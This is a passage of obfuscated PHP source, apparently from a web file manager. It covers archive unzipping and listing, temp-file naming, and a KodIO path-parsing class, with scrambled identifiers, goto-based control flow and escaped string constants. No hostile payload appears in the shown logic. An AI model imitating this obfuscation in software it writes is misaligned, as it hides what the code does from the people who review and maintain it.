get_path_father($eÚâ•¹«¤[$aÒ„â³¢ÂÊ[75]]); if (!$f±¨‰ÑÕÒŠ && $f¡‚ƒ°é­¿->getType() == $aÒ„â³¢ÂÊ[102]) { $E´¨Ôƒ£© = get_path_father($f¡‚ƒ°é­¿->path); } $Bï³‘«îªê = IO::info($E´¨Ôƒ£©); if (!$Bï³‘«îªê[$aÒ„â³¢ÂÊ[193]]) { show_json(LNG($aÒ„â³¢ÂÊ[1034]), !1); } } goto d±Àíø¹é; Aƒİˆ†Ÿ¿×: if (!$Dõ¤–ƒª×˜) { del_dir($eƒ´¾ÈÊè); show_json(LNG($aÒ„â³¢ÂÊ[1035]), !1); } del_dir($eƒ´¾ÈÊè); return $Dõ¤–ƒª×˜; goto D¥ÓáãÄ¶˜; D¥ÓáãÄ¶˜: } public static function unzip($d¦èƒÚô…, $D¹Ş¼†‚Ê¶ = "\162\x65\x70\x6c\x61\143\x65") { goto Eğœ¯ß …; fĞ¡’ä¹Á…: Hook::trigger($eİâˆøœ¢Í[1043], $Cè”°ÙÒ™À); recursion_dir($Cè”°ÙÒ™À, $f§§©®àŸ, $c¹ÅÄ†í™æ, 0); $eÔëÖèåƒª = array_merge($f§§©®àŸ, $c¹ÅÄ†í™æ); goto E’ñö†š“¡; CÌ ¸ÜöÃä: $cîÇ‡ç¢èÅ = self::tmpFileName($e°»‹¥¯¾); $Cè”°ÙÒ™À = TEMP_FILES . $cîÇ‡ç¢èÅ; del_dir($Cè”°ÙÒ™À); goto bÎ‚è¦é; E’ñö†š“¡: foreach ($eÔëÖèåƒª as $aòé…ÏÊ‹«) { $aòé…ÏÊ‹« = self::iconvApp($aòé…ÏÊ‹«); self::move($aòé…ÏÊ‹«, $Aù™ƒ’¡ƒï, $D¹Ş¼†‚Ê¶); } del_dir($Cè”°ÙÒ™À); if (!$f«ƒ–¤êï) { del_file($BŠËèÜÒ†); } goto aƒª…Éİ”È; dİŸÀ÷ÀĞ: if (!($e°»‹¥¯¾ = parent::info($aŒèŒÌ‰”À))) { show_json(LNG($eİâˆøœ¢Í[1037]), !1); } if (!($b›æµöîõ = parent::infoFull($Aù™ƒ’¡ƒï))) { $Aù™ƒ’¡ƒï = parent::mkdir($Aù™ƒ’¡ƒï); $b›æµöîõ = array($eİâˆøœ¢Í[75] => $Aù™ƒ’¡ƒï); } else { if (isset($b›æµöîõ[$eİâˆøœ¢Í[381]]) && trim($b›æµöîõ[$eİâˆøœ¢Í[75]], $eİâˆøœ¢Í[8]) != trim($Aù™ƒ’¡ƒï, $eİâˆøœ¢Í[8])) { $A•ÛŠ‡¡¹À = KodIO::make($b›æµöîõ[$eİâˆøœ¢Í[474]]); $FĞÚŒ‡Şëš = parent::fileNameAuto($A•ÛŠ‡¡¹À, $b›æµöîõ[$eİâˆøœ¢Í[28]], REPEAT_RENAME_FOLDER, !0); $Aù™ƒ’¡ƒï = parent::mkdir($A•ÛŠ‡¡¹À . $FĞÚŒ‡Şëš); $b›æµöîõ = array($eİâˆøœ¢Í[75] => $Aù™ƒ’¡ƒï); } } $Aù™ƒ’¡ƒï = $b›æµöîõ[$eİâˆøœ¢Í[75]]; goto CÌ ¸ÜöÃä; aƒª…Éİ”È: return !0; goto fßãÁ´ÅÈ™; Eğœ¯ß …: $eİâˆøœ¢Í =& $_SERVER[‡’¶øåüç˜]; $aŒèŒÌ‰”À = $d¦èƒÚô…[$eİâˆøœ¢Í[75]]; $Aù™ƒ’¡ƒï = $d¦èƒÚô…[$eİâˆøœ¢Í[1036]]; goto dİŸÀ÷ÀĞ; B†ÁªÉİÕ¤: $dí”ˆ´Æôá = KodArchive::extract($BŠËèÜÒ†, $Cè”°ÙÒ™À . $eİâˆøœ¢Í[8], $Fè¡ÎãˆŞ); self::archiveExt(); if (!$dí”ˆ´Æôá[$eİâˆøœ¢Í[1040]]) { show_json($eİâˆøœ¢Í[1041] . $dí”ˆ´Æôá[$eİâˆøœ¢Í[1042]], !1); } goto fĞ¡’ä¹Á…; bÎ‚è¦é: mk_dir($Cè”°ÙÒ™À); $Dó”‹Šœõ† = self::fileExt($e°»‹¥¯¾); $BŠËèÜÒ† = $Cè”°ÙÒ™À . $eİâˆøœ¢Í[91] . $Dó”‹Šœõ†; goto D·‘…è»”; D·‘…è»”: if (!@file_exists(self::iconvSystem($BŠËèÜÒ†))) { $f«ƒ–¤êï = self::localFilePath($aŒèŒÌ‰”À, $Dó”‹Šœõ†); $BŠËèÜÒ† = $f«ƒ–¤êï ? $f«ƒ–¤êï : parent::download($aŒèŒÌ‰”À, $BŠËèÜÒ†); } $BŠËèÜÒ† = self::iconvSystem($BŠËèÜÒ†); $Fè¡ÎãˆŞ = isset($d¦èƒÚô…[$eİâˆøœ¢Í[1038]]) ? $d¦èƒÚô…[$eİâˆøœ¢Í[1038]] : $eİâˆøœ¢Í[1039]; goto B†ÁªÉİÕ¤; fßãÁ´ÅÈ™: } public static function unzipList($cªÖ®À¢ªá) { goto b’–‘š¹ªø; E§‚ ­Äò: self::archiveExt(); del_dir($eâÓ´’ÃÕƒ); if (!$AÅÆä­Ÿƒõ[$F‚Öîª°Øİ[1040]]) { show_json($AÅÆä­Ÿƒõ[$F‚Öîª°Øİ[1042]], !1); } goto Aö„ŸØÓò÷; Aö„ŸØÓò÷: $E‚ôÈÉéÑ¤ = json_encode($AÅÆä­Ÿƒõ[$F‚Öîª°Øİ[1042]]); self::setContent($BŒß£‹§ò, $E‚ôÈÉéÑ¤); if (count($AÅÆä­Ÿƒõ[$F‚Öîª°Øİ[1042]]) >= $aéíêÃó—) { show_json(sprintf(LNG($F‚Öîª°Øİ[1046]), count($AÅÆä­Ÿƒõ[$F‚Öîª°Øİ[1042]])), !1); } goto e‘­Ì‰ªƒ¯; Eô·óõğ†: $cè­ÃÍÇŠ‚ = self::info($a¢¯‰ ØÀ¿); $féç¸Î÷À = self::fileExt($cè­ÃÍÇŠ‚); $b‹Œ±àªØ = self::tmpFileName($cè­ÃÍÇŠ‚); goto D£Ä¯ù¾¦; C§Îì”¾½‹: if (!is_dir($eâÓ´’ÃÕƒ)) { mk_dir($eâÓ´’ÃÕƒ); } $d‹á‹§ºº = $eâÓ´’ÃÕƒ . $F‚Öîª°Øİ[8] . $CÍ‰–×ô™Æ; if (!@file_exists(self::iconvSystem($d‹á‹§ºº))) { if (isset($D‡¦“Á‡¨¹)) { url_request($Bˆ¹°‹ªô, $F‚Öîª°Øİ[1047], $d‹á‹§ºº); } else { $AÉÔ·©›­ = self::localFilePath($Bˆ¹°‹ªô, $féç¸Î÷À); $d‹á‹§ºº = $AÉÔ·©›­ ? $AÉÔ·©›­ : self::download($Bˆ¹°‹ªô, $d‹á‹§ºº); } } goto c•Œ®Â³µÇ; D£Ä¯ù¾¦: if (isset($D‡¦“Á‡¨¹)) { $C¿ƒ´“¿í = array($D‡¦“Á‡¨¹[$F‚Öîª°Øİ[75]], $D‡¦“Á‡¨¹[$F‚Öîª°Øİ[1044]], $D‡¦“Á‡¨¹[$F‚Öîª°Øİ[28]]); $CÍ‰–×ô™Æ = md5(implode($F‚Öîª°Øİ[70], $C¿ƒ´“¿í)) . $F‚Öîª°Øİ[91] . get_path_ext($D‡¦“Á‡¨¹[$F‚Öîª°Øİ[28]]); } else { $C¿ƒ´“¿í = array($cè­ÃÍÇŠ‚[$F‚Öîª°Øİ[28]], $cè­ÃÍÇŠ‚[$F‚Öîª°Øİ[75]], $cè­ÃÍÇŠ‚[$F‚Öîª°Øİ[77]]); $CÍ‰–×ô™Æ = md5(implode($F‚Öîª°Øİ[70], $C¿ƒ´“¿í)) . $F‚Öîª°Øİ[91] . $féç¸Î÷À; } if ($cÍÍì›’¼ == -1) { $BŒß£‹§ò = IO_PATH_SYSTEM_TEMP . "\172\151\x70\126\151\145\x77\x2f{$b‹Œ±àªØ}\57{$CÍ‰–×ô™Æ}\x2e\154\157\147"; $fÕÕóÕéÍ‘ = self::infoFull($BŒß£‹§ò); if ($fÕÕóÕéÍ‘) { $BŒß£‹§ò = $fÕÕóÕéÍ‘[$F‚Öîª°Øİ[75]]; $a® ƒ„¤×¸ = self::getContent($BŒß£‹§ò); if ($a® ƒ„¤×¸) { $E‚ôÈÉéÑ¤ = json_decode($a® ƒ„¤×¸, !0); if (count($E‚ôÈÉéÑ¤) >= $aéíêÃó—) { show_json(sprintf(LNG($F‚Öîª°Øİ[1046]), count($E‚ôÈÉéÑ¤)), !1); } return $E‚ôÈÉéÑ¤; } } else { $BŒß£‹§ò = self::mkfile($BŒß£‹§ò); } } $eâÓ´’ÃÕƒ = TEMP_FILES . $b‹Œ±àªØ; goto C§Îì”¾½‹; b’–‘š¹ªø: $F‚Öîª°Øİ =& $_SERVER[‡’¶øåüç˜]; $Bˆ¹°‹ªô = $cªÖ®À¢ªá[$F‚Öîª°Øİ[75]]; $cÍÍì›’¼ = isset($cªÖ®À¢ªá[$F‚Öîª°Øİ[1044]]) ? $cªÖ®À¢ªá[$F‚Öîª°Øİ[1044]] : -1; goto cÙÊñİ„°; c•Œ®Â³µÇ: $d‹á‹§ºº = self::iconvSystem($d‹á‹§ºº); if ($cÍÍì›’¼ >= 0) { $eÅÉ¾ÜÆ¾¼ = isset($cªÖ®À¢ªá[$F‚Öîª°Øİ[1048]]) ? $cªÖ®À¢ªá[$F‚Öîª°Øİ[1048]] : !1; $CÇàÚÛê•¢ = isset($cªÖ®À¢ªá[$F‚Öîª°Øİ[28]]) ? $cªÖ®À¢ªá[$F‚Öîª°Øİ[28]] : $F‚Öîª°Øİ[33]; KodArchive::filePreview($d‹á‹§ºº, $cÍÍì›’¼, $eÅÉ¾ÜÆ¾¼, $CÇàÚÛê•¢); self::archiveExt(); die; } $AÅÆä­Ÿƒõ = KodArchive::listContent($d‹á‹§ºº); goto E§‚ ­Äò; e‘­Ì‰ªƒ¯: return $AÅÆä­Ÿƒõ[$F‚Öîª°Øİ[1042]]; goto a¹‰Ñ¶‰‘ä; cÙÊñİ„°: $aéíêÃó— = 50000; if (request_url_safe($Bˆ¹°‹ªô)) { $D‡¦“Á‡¨¹ = parse_url_query($Bˆ¹°‹ªô); if (!isset($D‡¦“Á‡¨¹[$F‚Öîª°Øİ[75]])) { show_json($F‚Öîª°Øİ[1045], !1); } } $a¢¯‰ ØÀ¿ = isset($D‡¦“Á‡¨¹) ? $D‡¦“Á‡¨¹[$F‚Öîª°Øİ[75]] : $Bˆ¹°‹ªô; goto Eô·óõğ†; a¹‰Ñ¶‰‘ä: } private static function fileExt($FÇÊëÄºŸ’) { $E·ÁÌÅ†•Â =& $_SERVER[‡’¶øåüç˜]; $Fª÷ƒÄãŠÆ = $FÇÊëÄºŸ’[$E·ÁÌÅ†•Â[165]]; if ($Fª÷ƒÄãŠÆ == $E·ÁÌÅ†•Â[1049]) { $A·òê”Ó×§ = $E·ÁÌÅ†•Â[1050]; if (substr($FÇÊëÄºŸ’[$E·ÁÌÅ†•Â[28]], -strlen($A·òê”Ó×§)) == $A·òê”Ó×§) { $Fª÷ƒÄãŠÆ = $E·ÁÌÅ†•Â[1051]; } } self::archiveExt($Fª÷ƒÄãŠÆ); return $Fª÷ƒÄãŠÆ; } private static function zipFileList($A±Çî‰ç¨±, $dÁœœ‡ŞíÖ = false) { $dÀğÍ‡Ë =& $_SERVER[‡’¶øåüç˜]; $EÏçó Ÿïƒ = array(); foreach ($A±Çî‰ç¨± as $A†¨‰ãÍÎó) { $E³ÇŸ‰ = $A†¨‰ãÍÎó[$dÀğÍ‡Ë[75]]; if ($dÁœœ‡ŞíÖ) { $E³ÇŸ‰ = self::copy($A†¨‰ãÍÎó[$dÀğÍ‡Ë[75]], $dÁœœ‡ŞíÖ, $dÀğÍ‡Ë[750]); } else { $f±Ñì³Óà¶ = self::init($A†¨‰ãÍÎó[$dÀğÍ‡Ë[75]]); if ($f±Ñì³Óà¶->getType() == $dÀğÍ‡Ë[102]) { $E³ÇŸ‰ = $f±Ñì³Óà¶->path; } } if ($E³ÇŸ‰ && self::local()->exist($E³ÇŸ‰)) { $EÏçó Ÿïƒ[$A†¨‰ãÍÎó[$dÀğÍ‡Ë[75]]] = $E³ÇŸ‰; } } if (!empty($EÏçó Ÿïƒ)) { return array_values($EÏçó Ÿïƒ); } show_json(LNG($dÀğÍ‡Ë[1017]), !1); } public static function tmpFileName($b‰ËÛ§Ô‰±) { $fíëœ©İã÷ =& $_SERVER[‡’¶øåüç˜]; $A¸™£æ”Ø² = array($b‰ËÛ§Ô‰±[$fíëœ©İã÷[28]], $b‰ËÛ§Ô‰±[$fíëœ©İã÷[75]], $b‰ËÛ§Ô‰±[$fíëœ©İã÷[77]], $b‰ËÛ§Ô‰±[$fíëœ©İã÷[472]]); return md5(implode($fíëœ©İã÷[70], $A¸™£æ”Ø²)); } private static function localFilePath($aÓ¦‰İïÒÓ, $Bó±»ù¿) { goto eËô”‚ˆ•ë; eËô”‚ˆ•ë: $fíŠ•Ö” =& $_SERVER[‡’¶øåüç˜]; if ($Bó±»ù¿ == $fíŠ•Ö”[1052] && strtoupper(substr(PHP_OS, 0, 3)) == $fíŠ•Ö”[1053]) { return !1; } $f® óØÏÉï = KodIO::parse($aÓ¦‰İïÒÓ); goto DŠ™Î¤Ó‘; C‹—‡Šöƒƒ: if ($aîñÌ•ïˆ == $fíŠ•Ö”[102] || $aîñÌ•ïˆ == $fíŠ•Ö”[1055]) { if (!$aÄ‹‡áÜã->exist($aÄ‹‡áÜã->path)) { show_json(LNG($fíŠ•Ö”[101]), !1); } return $aÄ‹‡áÜã->path; } return !1; goto A±œå©Ã÷¶; DŠ™Î¤Ó‘: if ($f® óØÏÉï[$fíŠ•Ö”[29]] == KodIO::KOD_SOURCE) { $añ°±Õ“’ƒ = Model($fíŠ•Ö”[758])->fileInfoGet(KodIO::sourceID($aÓ¦‰İïÒÓ)); if (!$añ°±Õ“’ƒ[$fíŠ•Ö”[75]]) { show_json($fíŠ•Ö”[1054], !1); } $aÓ¦‰İïÒÓ = $añ°±Õ“’ƒ[$fíŠ•Ö”[75]]; } $aÄ‹‡áÜã = self::init($aÓ¦‰İïÒÓ); $aîñÌ•ïˆ = $aÄ‹‡áÜã->getType(); goto C‹—‡Šöƒƒ; A±œå©Ã÷¶: } private static function archiveExt($E™Ÿãƒ×Ö = '') { $GLOBALS[$_SERVER[‡’¶øåüç˜][1056]] = $E™Ÿãƒ×Ö; } } class KodIO { const KOD_SOURCE = "\173\163\157\165\x72\143\145\x7d"; const KOD_USER_RECYCLE = "\173\165\x73\145\x72\122\x65\x63\x79\x63\x6c\145\175"; const KOD_USER_FAV = "\173\165\163\x65\x72\x46\x61\x76\175"; const KOD_USER_FILE_TAG = "\173\165\x73\145\162\x46\151\x6c\145\x54\x61\x67\x7d"; const KOD_USER_FILE_TYPE = "\173\x75\x73\x65\x72\106\x69\x6c\145\x54\171\x70\x65\175"; const KOD_GROUP_ROOT_SELF = "\x7b\147\x72\157\165\x70\122\x6f\x6f\x74\x53\145\x6c\146\x7d"; const KOD_USER_SHARE = "\x7b\165\x73\145\x72\123\x68\141\162\x65\x7d"; const KOD_USER_SHARE_LINK = "\x7b\x75\163\145\162\x53\150\x61\162\145\x4c\151\156\153\175"; const KOD_USER_SHARE_TO_ME = "\173\x73\150\x61\162\145\124\157\115\x65\x7d"; const KOD_SHARE_ITEM = "\x7b\x73\x68\x61\162\x65\111\x74\x65\155\175"; const KOD_SHARE_LINK = "\x7b\x73\x68\141\162\145\111\x74\x65\155\x4c\x69\156\153\175"; const KOD_SEARCH = "\x7b\x73\x65\x61\x72\143\x68\175"; const KOD_BLOCK = "\x7b\x62\x6c\157\x63\x6b\175"; const KOD_IO = "\x7b\x69\x6f\x7d"; const KOD_USER_RECENT = "\x7b\x75\163\x65\x72\122\145\x6e\143\x65\x6e\164\175"; const KOD_USER_DRIVER = "\173\144\162\151\x76\145\162\x7d"; public static function typeList() { $EÍ¨š¢†å‰ =& $_SERVER[‡’¶øåüç˜]; return array($EÍ¨š¢†å‰[1057] => self::KOD_SOURCE, $EÍ¨š¢†å‰[1058] => self::KOD_USER_RECYCLE, $EÍ¨š¢†å‰[1059] => self::KOD_USER_FAV, $EÍ¨š¢†å‰[1060] => self::KOD_USER_FILE_TAG, $EÍ¨š¢†å‰[1061] => self::KOD_USER_FILE_TYPE, $EÍ¨š¢†å‰[1062] => self::KOD_GROUP_ROOT_SELF, $EÍ¨š¢†å‰[1063] => self::KOD_USER_SHARE, $EÍ¨š¢†å‰[1064] => self::KOD_USER_SHARE_LINK, $EÍ¨š¢†å‰[1065] => self::KOD_USER_SHARE_TO_ME, $EÍ¨š¢†å‰[1066] => self::KOD_SHARE_ITEM, $EÍ¨š¢†å‰[1067] => self::KOD_SHARE_LINK, $EÍ¨š¢†å‰[1068] => self::KOD_SEARCH, $EÍ¨š¢†å‰[1069] => self::KOD_BLOCK, $EÍ¨š¢†å‰[1070] => self::KOD_IO, $EÍ¨š¢†å‰[1071] => self::KOD_USER_RECENT, $EÍ¨š¢†å‰[1072] => self::KOD_USER_DRIVER); } public static function parse($ašÓ‰ö…Æ¢) { goto DÂ²ª‡ˆá¹; DÂ²ª‡ˆá¹: $A»ŠÓ–ÉË =& $_SERVER[‡’¶øåüç˜]; $ašÓ‰ö…Æ¢ = self::clear($ašÓ‰ö…Æ¢); $C¸†Œ‰Øƒ = array_values(self::typeList()); goto d¦‰Í­ßÊŞ; Bèê…¨: $Eë®õ®Šò– = array($A»ŠÓ–ÉË[33], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $fÓªÉ‰¬†Ú[$A»ŠÓ–ÉË[1077]] = in_array($fÓªÉ‰¬†Ú[$A»ŠÓ–ÉË[29]], $Eë®õ®Šò–); return $fÓªÉ‰¬†Ú; goto Dîöƒ‰ôöÖ; d¦‰Í­ßÊŞ: preg_match($A»ŠÓ–ÉË[1073], $ašÓ‰ö…Æ¢, $dñ¿ÚãÀ¨Ó); $fÓªÉ‰¬†Ú = array($A»ŠÓ–ÉË[400] => !1, $A»ŠÓ–ÉË[1074] => !1, $A»ŠÓ–ÉË[397] => !1, $A»ŠÓ–ÉË[75] => $ašÓ‰ö…Æ¢, $A»ŠÓ–ÉË[1021] => !1, $A»ŠÓ–ÉË[1020] => $A»ŠÓ–ÉË[33]); if (is_array($dñ¿ÚãÀ¨Ó) && count($dñ¿ÚãÀ¨Ó) == 5) { $e¾ÆâŸŒÉ = $A»ŠÓ–ÉË[1075] . $dñ¿ÚãÀ¨Ó[2] . $A»ŠÓ–ÉË[319]; if (in_array($e¾ÆâŸŒÉ, $C¸†Œ‰Øƒ)) { $fÓªÉ‰¬†Ú[$A»ŠÓ–ÉË[1021]] = $dñ¿ÚãÀ¨Ó[1]; $fÓªÉ‰¬†Ú[$A»ŠÓ–ÉË[29]] = $e¾ÆâŸŒÉ; $fÓªÉ‰¬†Ú[$A»ŠÓ–ÉË[1076]] = substr($e¾ÆâŸŒÉ, 1, -1); $fÓªÉ‰¬†Ú[$A»ŠÓ–ÉË[371]] = $dñ¿ÚãÀ¨Ó[3]; } $fÓªÉ‰¬†Ú[$A»ŠÓ–ÉË[1020]] = $dñ¿ÚãÀ¨Ó[4]; } goto Bèê…¨; Dîöƒ‰ôöÖ: } public static function clear($aœªÃÓ¼ŠÏ) { goto aòÉß”õ¢; d²á—ÁÄÍ: return $aœªÃÓ¼ŠÏ; goto A·óñ¸±¯î; BÉ™¯Ê‘ø—: $aœªÃÓ¼ŠÏ = preg_replace($B°Ä¡›÷ÀØ[1080], $B°Ä¡›÷ÀØ[8], $aœªÃÓ¼ŠÏ); if ($aœªÃÓ¼ŠÏ == $B°Ä¡›÷ÀØ[8]) { return $B°Ä¡›÷ÀØ[8]; } $aœªÃÓ¼ŠÏ = rtrim($aœªÃÓ¼ŠÏ, $B°Ä¡›÷ÀØ[8]); goto d²á—ÁÄÍ; aòÉß”õ¢: $B°Ä¡›÷ÀØ =& $_SERVER[‡’¶øåüç˜]; $aœªÃÓ¼ŠÏ = str_replace(array($B°Ä¡›÷ÀØ[996], $B°Ä¡›÷ÀØ[221]), $B°Ä¡›÷ÀØ[50], $aœªÃÓ¼ŠÏ); $aœªÃÓ¼ŠÏ = str_replace($B°Ä¡›÷ÀØ[93], $B°Ä¡›÷ÀØ[8], $aœªÃÓ¼ŠÏ); goto EÈåÓîç×; EÈåÓîç×: $f™Œ•ºÁŠ´ = $B°Ä¡›÷ÀØ[1078]; if (substr($aœªÃÓ¼ŠÏ, 0, 3) == $B°Ä¡›÷ÀØ[1079]) { $aœªÃÓ¼ŠÏ = substr($aœªÃÓ¼ŠÏ, 3); } while (strstr($aœªÃÓ¼ŠÏ, $f™Œ•ºÁŠ´)) { $aœªÃÓ¼ŠÏ = str_replace($f™Œ•ºÁŠ´, $B°Ä¡›÷ÀØ[8], $aœªÃÓ¼ŠÏ); } goto BÉ™¯Ê‘ø—; A·óñ¸±¯î: } public static function sourceID($D„·½íâ) { $C‡†’›±›ã =& $_SERVER[‡’¶øåüç˜]; $A‘”¼¦ÕŞœ = self::parse($D„·½íâ); if ($A‘”¼¦ÕŞœ[$C‡†’›±›ã[29]] !== self::KOD_SOURCE) { show_json(LNG($C‡†’›±›ã[1081]), !1); } return $A‘”¼¦ÕŞœ[$C‡†’›±›ã[371]]; } public static function make($cøÈ›Ç) { if (!$cøÈ›Ç) { return !1; } return self::makePath(self::KOD_SOURCE, intval($cøÈ›Ç)); } public static function makeShare($FààÛÛ»„÷, $a®¦‘ª½‡Ò) { return self::makePath(self::KOD_SHARE_ITEM, $FààÛÛ»„÷, $a®¦‘ª½‡Ò); } public static function makeFileTypePath($eñÎ¡é¶Ìµ) { return self::makePath(self::KOD_USER_FILE_TYPE, $eñÎ¡é¶Ìµ); } public static function makeFileTagPath($bÂ•èëˆÎ) { return self::makePath(self::KOD_USER_FILE_TAG, $bÂ•èëˆÎ); } public static function makePath($C¼‘¯©ØöĞ, $A×é† ÌÉ™ = '', $dŞñÂŞâºØ = '') { $b•’Ü«º› =& $_SERVER[‡’¶øåüç˜]; $f‡º‰Ğùì = substr($C¼‘¯©ØöĞ, 1, -1); $b´Şø¢¯‘ù = $b•’Ü«º›[1082] . $f‡º‰Ğùì . $b•’Ü«º›[1083] . $A×é† ÌÉ™ . $b•’Ü«º›[1084]; $b´Şø¢¯‘ù = $dŞñÂŞâºØ ? $b´Şø¢¯‘ù . $dŞñÂŞâºØ . $b•’Ü«º›[8] : $b´Şø¢¯‘ù; return $b´Şø¢¯‘ù; } public static function hashPath($F… Âñì±Ì) { $aéæ½ö×É =& $_SERVER[‡’¶øåüç˜]; $f®´³ÂˆÏ« = is_array($F… Âñì±Ì) ? $F… Âñì±Ì : IO::info($F… Âñì±Ì); $FˆÙã×‚öö = _get($f®´³ÂˆÏ«, $aéæ½ö×É[1085], $aéæ½ö×É[33]); if (!$FˆÙã×‚öö) { $A¥ãªˆÍÆ… = KodIO::parse($f®´³ÂˆÏ«[$aéæ½ö×É[75]]); if (!$A¥ãªˆÍÆ…[$aéæ½ö×É[29]]) { $FˆÙã×‚öö = IO::hashSimple($f®´³ÂˆÏ«[$aéæ½ö×É[75]]); } } if (!$FˆÙã×‚öö) { $FˆÙã×‚öö = md5($f®´³ÂˆÏ«[$aéæ½ö×É[75]] . $f®´³ÂˆÏ«[$aéæ½ö×É[77]] . $f®´³ÂˆÏ«[$aéæ½ö×É[107]]); } return $FˆÙã×‚öö; } public static function initSystemPath() { $eŞÎù‚ë¬˜ =& $_SERVER[‡’¶øåüç˜]; if (defined($eŞÎù‚ë¬˜[1086])) { return; } define($eŞÎù‚ë¬˜[1086], self::systemPath($eŞÎù‚ë¬˜[1087])); define($eŞÎù‚ë¬˜[1088], self::systemPath($eŞÎù‚ë¬˜[1089])); define($eŞÎù‚ë¬˜[1090], self::systemPath($eŞÎù‚ë¬˜[1091])); define($eŞÎù‚ë¬˜[1092], self::systemPath($eŞÎù‚ë¬˜[1093])); } public static function systemPath($f³ì¤ÈŠ§¶) { goto c›¸Ş‹á¡÷; c›¸Ş‹á¡÷: $CğŞ‰ÜŒ± =& $_SERVER[‡’¶øåüç˜]; $BÈ½éÈÄáñ = $CğŞ‰ÜŒ±[1094] . ucfirst($f³ì¤ÈŠ§¶); $bèé¹Ìí = Model($CğŞ‰ÜŒ±[1095])->get($BÈ½éÈÄáñ); goto b’§İÑËêì; däÒÂé÷ŠŒ: return $bèé¹Ìí; goto F–åƒ¡ÂˆÙ; b’§İÑËêì: if ($bèé¹Ìí) { return $bèé¹Ìí; } if ($f³ì¤ÈŠ§¶ == $CğŞ‰ÜŒ±[1087]) { $bèé¹Ìí = self::make(Model($CğŞ‰ÜŒ±[758])->systemRootPathAdd($CğŞ‰ÜŒ±[1096])); } else { $bèé¹Ìí = self::systemPath($CğŞ‰ÜŒ±[1087]); $DÃÅ§†¢Ù„ = self::sourceID($bèé¹Ìí); $bèé¹Ìí = self::make(Model($CğŞ‰ÜŒ±[758])->mkdir($DÃÅ§†¢Ù„, $f³ì¤ÈŠ§¶)); } Model($CğŞ‰ÜŒ±[1095])->set($BÈ½éÈÄáñ, $bèé¹Ìí); goto däÒÂé÷ŠŒ; F–åƒ¡ÂˆÙ: } public static function systemFolder($FãˆÜ„) { $E“ÍÔÅŠö = IO_PATH_SYSTEM_SOURCE . $FãˆÜ„; $D¶İŸÆ…Ùå = Cache::get($E“ÍÔÅŠö); if (!$D¶İŸÆ…Ùå) { $dôåÀ³Ø = IO::infoFull($E“ÍÔÅŠö); if (!$dôåÀ³Ø) { $D¶İŸÆ…Ùå = IO::mkdir($E“ÍÔÅŠö, REPEAT_SKIP); } else { $D¶İŸÆ…Ùå = $dôåÀ³Ø[$_SERVER[‡’¶øåüç˜][75]]; } Cache::set($E“ÍÔÅŠö, $D¶İŸÆ…Ùå, 3600 * 10); } return $D¶İŸÆ…Ùå; } public static function defaultDriver() { return Model($_SERVER[‡’¶øåüç˜][709])->defaultDriver(); } public static function defaultIO() { $D‚‡öÊÛí =& $_SERVER[‡’¶øåüç˜]; $fÎå¢ÃÓ¤‘ = self::defaultDriver(); return $D‚‡öÊÛí[1097] . $fÎå¢ÃÓ¤‘[$D‚‡öÊÛí[371]] . $D‚‡öÊÛí[1084]; } public static function defaultDriverInit() { static $b­³ùËŒÊ = false; if ($b­³ùËŒÊ) { return $b­³ùËŒÊ; } $b­³ùËŒÊ = IO::init(self::defaultIO()); return $b­³ùËŒÊ; } public static function fileTypeList() { $DÏç¸…¾¶ =& $_SERVER[‡’¶øåüç˜]; $dôÏ¬…Ñˆá = $GLOBALS[$DÏç¸…¾¶[6]][$DÏç¸…¾¶[1098]]; foreach ($dôÏ¬…Ñˆá as $BÚº“¨Ìí³ => $b¤¯õìŞ™ ) { $Eí¯ò÷¿â… = $DÏç¸…¾¶[1099] . $BÚº“¨Ìí³; $EßµÔº‹ÉĞ = LNG($Eí¯ò÷¿â…); if ($Eí¯ò÷¿â… != $EßµÔº‹ÉĞ) { $dôÏ¬…Ñˆá[$BÚº“¨Ìí³][$DÏç¸…¾¶[28]] = $EßµÔº‹ÉĞ; } } return $dôÏ¬…Ñˆá; } public static function transferType($d±äğ¤ƒ®, $dö˜Ã•’èÌ) { goto FŸïì‘Å”â; FŸïì‘Å”â: $Fôº‹ŞÃ¬¦ =& $_SERVER[‡’¶øåüç˜]; $cÇ¶Õôª‰Ÿ = self::driverType($d±äğ¤ƒ®); $C¢»˜½¿œĞ = self::driverType($dö˜Ã•’èÌ); goto d¬ì÷ÁÏ­; BÉ‚±×¨Œ: return $Fôº‹ŞÃ¬¦[1102]; goto aĞ÷¼Ÿİ‚ê; d¬ì÷ÁÏ­: if ($cÇ¶Õôª‰Ÿ[$Fôº‹ŞÃ¬¦[29]] == $C¢»˜½¿œĞ[$Fôº‹ŞÃ¬¦[29]] && $cÇ¶Õôª‰Ÿ[$Fôº‹ŞÃ¬¦[1100]] == $C¢»˜½¿œĞ[$Fôº‹ŞÃ¬¦[1100]]) { return $Fôº‹ŞÃ¬¦[1101]; } if ($cÇ¶Õôª‰Ÿ[$Fôº‹ŞÃ¬¦[29]] == $Fôº‹ŞÃ¬¦[788] && $C¢»˜½¿œĞ[$Fôº‹ŞÃ¬¦[29]] == $Fôº‹ŞÃ¬¦[102]) { return $Fôº‹ŞÃ¬¦[1048]; } if ($cÇ¶Õôª‰Ÿ[$Fôº‹ŞÃ¬¦[29]] == $Fôº‹ŞÃ¬¦[102] && $C¢»˜½¿œĞ[$Fôº‹ŞÃ¬¦[29]] == $Fôº‹ŞÃ¬¦[788]) { return $Fôº‹ŞÃ¬¦[103]; } goto BÉ‚±×¨Œ; aĞ÷¼Ÿİ‚ê: } public static function driverType($D‰»ç î‡Ã) { goto BŞ®à¢®Í; fÍ×ÖãƒÒ: return array($DóÓÈ±¸Ã¹[29] => $DóÓÈ±¸Ã¹[788], $DóÓÈ±¸Ã¹[1100] => $D‰»ç î‡Ã->pathDriver, $DóÓÈ±¸Ã¹[75] => $B®Àáµ¿ø); goto BÎ‰¯áä¤’; fáŠäŸœÛõ: if ($bàÛ‚¬¤‹ == $DóÓÈ±¸Ã¹[700] || $bàÛ‚¬¤‹ == $DóÓÈ±¸Ã¹[1104] || $bàÛ‚¬¤‹ == $DóÓÈ±¸Ã¹[1105]) { $D‰»ç î‡Ã = self::defaultDriverInit(); } else { if ($bàÛ‚¬¤‹ == $DóÓÈ±¸Ã¹[1055] || $bàÛ‚¬¤‹ == $DóÓÈ±¸Ã¹[1106]) { $D‰»ç î‡Ã = IO::init($D‰»ç î‡Ã->pathParse[$DóÓÈ±¸Ã¹[1002]]); } } $bàÛ‚¬¤‹ = 